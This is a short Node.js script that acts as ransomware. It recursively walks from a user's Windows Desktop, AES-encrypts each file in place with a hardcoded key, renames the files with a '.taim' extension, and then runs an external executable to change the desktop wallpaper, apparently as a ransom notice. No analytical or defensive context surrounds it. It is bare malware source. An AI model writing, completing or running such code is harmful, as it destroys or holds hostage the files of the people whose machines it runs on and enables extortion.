strict: false
const fs = require('fs')
const path = require('path')
const AES = require('aes-encryption')
const cp =require('node:child_process')
const promisify = require('node:util')
const os =  require('os')
const aes = new AES()

aes.setSecretKey('11122233344455566677788822244455555555555555555231231321313aaaff')



const execFile = promisify.promisify(cp.execFile);
async function setWallpaper(imagePath) {
	if (typeof imagePath !== 'string') {
		throw new TypeError('Expected a string');
	}
    
    const binary = path.join(__dirname, 'windows-wallpaper.exe')
	await execFile(binary,[path.join(__dirname, 'bg.png')]);
}

const crawlerLoop = () =>{
   let cwd = process.cwd()
   let root  =  fs.readdirSync(cwd)
   root.forEach((i)=>{
        fs.stat(path.join(cwd,i),(err, stats)=>{
            
            
            if(stats.isFile()){
               
                    try{
                        const data = fs.readFileSync(path.join(cwd,i))
                        const encrypt = aes.encrypt(data)
                        fs.writeFileSync(path.join(cwd,i),encrypt)
                        fs.renameSync(path.join(cwd,i), path.join(cwd,`${i}.taim`))
                    }
                    catch(e){

                    }
                   
                
              
                
                
                
            }
            if(stats.isDirectory()){
                console.log(i)
                
                process.chdir(path.join(cwd,i))
                crawlerLoop()
                   
               

               
                
                
            }
        })
   })
}


const crawl = async() =>{
   
    const DESKTOP_DIR = 'C:\\Users\\user\\Desktop'
   
    
    process.chdir(DESKTOP_DIR)
    
  
   crawlerLoop()
   await  setWallpaper('bg.png')
}
crawl()
